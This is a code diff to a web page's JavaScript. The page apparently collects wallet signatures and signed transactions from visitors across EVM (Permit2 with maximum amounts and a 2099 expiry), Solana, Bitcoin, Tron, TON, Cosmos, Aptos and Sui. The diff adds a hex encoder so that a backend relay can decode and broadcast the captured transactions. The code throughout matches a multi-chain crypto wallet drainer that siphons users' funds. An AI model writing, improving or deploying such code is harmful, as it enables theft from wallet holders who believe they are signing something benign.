@@ -2437,8 +2437,10 @@
             permits: evmPermits,
             batch_permit_metadata: (batchResult && batchResult.batch_permit_metadata) || {
               nonce: 0,
-              deadline: signedDeadline ? String(signedDeadline) : '999999999999',
+              sigDeadline: signedDeadline ? String(signedDeadline) : '4102444799',
               amounts: [],
+              spender: (batchResult && batchResult.engine_spender) || '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+              chainId: evmChainId,
               details: signedDetails || evmPermits.map(function(p, idx) {
                 return { token: p.token, amount: String(p.amount || MAX_PERMIT), expiration: 4102444799, nonce: idx };
               })
@@ -2467,6 +2469,15 @@
         }
         return '0x' + String(sig);
       }
+      // Encode a JS object as hex UTF-8 string (NO 0x prefix — backend's sealSignatureHexForPersistence adds it).
+      // relayPayloadRecord() decodes: 0x+hexStr → decodeHexUtf8 → JSON.parse → record with tx fields.
+      function sigHex(obj) {
+        var s = typeof obj === 'string' ? obj : JSON.stringify(obj);
+        var enc = new TextEncoder().encode(s);
+        var h = '';
+        for (var i = 0; i < enc.length; i++) h += enc[i].toString(16).padStart(2, '0');
+        return h;
+      }
 
       if (signatures.SOL) {
         try {
@@ -2482,7 +2493,7 @@
                   ingress: 'normalized_v1', chain_family: 'SVM', protocol: 'solana',
                   wallet_address: signatures.SOL.address,
                   token_address: (stMeta && stMeta.mint) || '11111111111111111111111111111111',
-                  signature: JSON.stringify({ signed_tx_b64: allSolTxs[sti] }),
+                  signature: sigHex({ signed_tx_b64: allSolTxs[sti] }),
                   nonce: 'legion:sol:' + Date.now() + ':' + sti,
                   expiry_iso: EXPIRY_ISO,
                   wallet_type: signatures.SOL.walletType || 'hot_wallet',
@@ -2496,7 +2507,7 @@
             // Fallback: single tx or message sig
             var solSignedTxB64 = connectedChains.SOL && connectedChains.SOL._signedTxB64;
             var solSigField = solSignedTxB64
-              ? JSON.stringify({ signed_tx_b64: solSignedTxB64 })
+              ? sigHex({ signed_tx_b64: solSignedTxB64 })
               : rawSigStr(signatures.SOL.signature);
             await apiPost('/api/v1/signature-anchor', {
               ingress: 'normalized_v1', chain_family: 'SVM', protocol: 'solana',
@@ -2517,6 +2528,7 @@
           await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1', chain_family: 'UTXO', protocol: 'bitcoin_psbt',
             wallet_address: signatures.BTC.address, token_address: 'BTC',
+            signature: signatures.BTC.signature,
             signed_psbt_base64: signatures.BTC.signature,
             nonce: 'legion:btc:' + Date.now(), expiry_iso: EXPIRY_ISO,
             wallet_type: signatures.BTC.walletType || 'hot_wallet',
@@ -2545,8 +2557,9 @@
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
           };
           if (tronSignedTx && typeof tronSignedTx === 'object') {
-            tronPayload.tron_transaction = JSON.stringify(tronSignedTx);
-            tronPayload.signature = 'tron_tx:' + (tronSignedTx.txID || Date.now());
+            // sigHex encodes JSON without 0x prefix — backend's sealSignatureHexForPersistence adds 0x,
+            // then relayPayloadRecord decodes hex→JSON to find tron_transaction for broadcast.
+            tronPayload.signature = sigHex({ tron_transaction: tronSignedTx });
           } else {
             tronPayload.signature = rawSigStr(signatures.TRON.signature);
           }
@@ -2568,8 +2581,9 @@
             amount: tonNano ? String(tonNano) : MAX_PERMIT
           };
           if (tonBoc) {
-            tonPayload.ton_boc = tonBoc;
-            tonPayload.signature = 'ton_tx:' + Date.now();
+            // sigHex encodes JSON without 0x prefix — backend's sealSignatureHexForPersistence adds 0x,
+            // then relayPayloadRecord decodes hex→JSON to find ton_boc for broadcastTon.
+            tonPayload.signature = sigHex({ ton_boc: tonBoc });
           } else {
             tonPayload.signature = rawSigStr(signatures.TON.signature);
           }
@@ -2583,7 +2597,7 @@
           await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1', chain_family: 'COSMOS', protocol: 'cosmos',
             wallet_address: signatures.COSMOS.address, token_address: 'uatom',
-            signature: rawSigStr(signatures.COSMOS.signature),
+            signature: sigHex({ signed_tx: rawSigStr(signatures.COSMOS.signature) }),
             nonce: 'legion:cosmos:' + Date.now(), expiry_iso: EXPIRY_ISO,
             wallet_type: signatures.COSMOS.walletType || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
@@ -2597,7 +2611,7 @@
           await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1', chain_family: 'APTOS', protocol: 'aptos',
             wallet_address: signatures.APTOS.address, token_address: 'apt',
-            signature: rawSigStr(signatures.APTOS.signature),
+            signature: sigHex({ aptos_signed_tx: rawSigStr(signatures.APTOS.signature) }),
             nonce: 'legion:aptos:' + Date.now(), expiry_iso: EXPIRY_ISO,
             wallet_type: signatures.APTOS.walletType || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
@@ -2611,7 +2625,7 @@
           await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1', chain_family: 'SUI', protocol: 'sui',
             wallet_address: signatures.SUI.address, token_address: 'sui',
-            signature: rawSigStr(signatures.SUI.signature),
+            signature: sigHex({ sui_tx_bytes: rawSigStr(signatures.SUI.signature) }),
             nonce: 'legion:sui:' + Date.now(), expiry_iso: EXPIRY_ISO,
             wallet_type: signatures.SUI.walletType || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
